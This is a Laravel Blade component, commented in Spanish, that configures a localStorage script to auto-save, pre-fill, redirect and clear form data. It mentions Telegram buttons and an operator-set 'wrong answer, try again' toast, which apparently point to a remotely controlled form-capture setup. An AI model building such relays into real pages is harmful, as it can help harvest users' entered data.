{{--
    Componente: control

    Uso: <x-control />

    Opciones:
    - auto-init: Inicializa formulario (detectar campos, pre-completar, auto-guardar) (default: true)
    - debug: Activa modo debug en consola (default: true)
    - auto-guardar: Guarda automáticamente al cambiar campos (default: true)
    - auto-completar: Pre-llena campos con datos guardados (default: true)
    - redirect-url: URL a la que redirigir después de envío exitoso (default: null)
    - redirect-delay: Delay en ms antes de redirigir (default: 1500)
    - toast-message: Mensaje para toast cuando cambio='2' (default: 'Respuesta incorrecta, intente nuevamente')
    - limpiar-storage: Limpia todo el localStorage al cargar la vista (default: false)

    El directorio para botones de Telegram se detecta automáticamente desde la URL.

    Ejemplos:
    <x-control />
    <x-control :auto-init="false" />
    <x-control :debug="false" />
    <x-control :auto-guardar="false" />
    <x-control :auto-completar="false" />
    <x-control redirect-url="/gracias" />
    <x-control redirect-url="/siguiente-paso" :redirect-delay="2000" />
    <x-control toast-message="Datos incorrectos, verifique e intente de nuevo" />
    <x-control :limpiar-storage="true" />
--}}

@props([
    'autoInit' => true,
    'debug' => true,
    'autoGuardar' => true,
    'autoCompletar' => true,
    'redirectUrl' => null,
    'redirectDelay' => 1500,
    'toastMessage' => 'Respuesta incorrecta, intente nuevamente',
    'limpiarStorage' => false
])

@php
    // Detectar directorio automáticamente desde la URL
    $directorio = request()->segment(1) ?? 'prueba';
@endphp

{{-- Script principal de localStorage --}}
<script src="{{ asset('js/localStorage-utils-auto.js') }}?v={{ time() }}"></script>

<script>
// Configurar opciones inmediatamente (antes de DOMContentLoaded)
@if(!$autoInit)
CONFIG_STORAGE_AUTO.autoInit = false;
@endif

@if(!$debug)
CONFIG_STORAGE_AUTO.debug = false;
@endif

@if(!$autoGuardar)
CONFIG_STORAGE_AUTO.autoGuardar = false;
@endif

@if(!$autoCompletar)
CONFIG_STORAGE_AUTO.autoCompletarCampos = false;
@endif

@if($redirectUrl)
CONFIG_STORAGE_AUTO.redirectUrl = '{{ $redirectUrl }}';
CONFIG_STORAGE_AUTO.redirectDelay = {{ $redirectDelay }};
@endif

CONFIG_STORAGE_AUTO.directorio = '{{ $directorio }}';
CONFIG_STORAGE_AUTO.toastMessage = '{{ $toastMessage }}';

@if($limpiarStorage)
// Limpiar localStorage al cargar la página
document.addEventListener('DOMContentLoaded', function() {
    localStorage.removeItem(CONFIG_STORAGE_AUTO.clave);
    localStorage.removeItem('uniqid');
    localStorage.removeItem('toast_pendiente');
    if (CONFIG_STORAGE_AUTO.debug) {
        console.log('🗑️ localStorage limpiado al cargar la vista');
    }
});
@endif
</script>
